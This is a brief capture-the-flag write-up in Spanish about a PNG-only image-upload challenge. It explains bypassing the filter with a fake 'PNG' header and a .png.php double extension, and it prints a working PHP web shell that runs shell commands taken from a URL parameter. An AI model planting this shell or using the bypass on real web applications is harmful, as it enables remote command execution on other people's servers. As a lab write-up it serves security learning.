### Descripcion
#### Description

I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:65391/)!

### Solucion
Vimos que se puede subir archivos, por lo que ahora intentaremos subir archivos, le tratamos de subir un archivo que solo tuviera la extension png
no funciona y ahora le ponemos PNG al principio del archivo, y lo sbimos, y ahora si deja.
Como vemos que es php, buscamos un codiguito sencillo de web shell para poder ejecutarm comandos sencillos, y lo subimos como hola.png.php
```php
PNG
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```
Usmeamos por la pc, y le hacemos un cat al archivo que hay 
![[Pasted image 20250403131333.png]]

### Tags
#webshell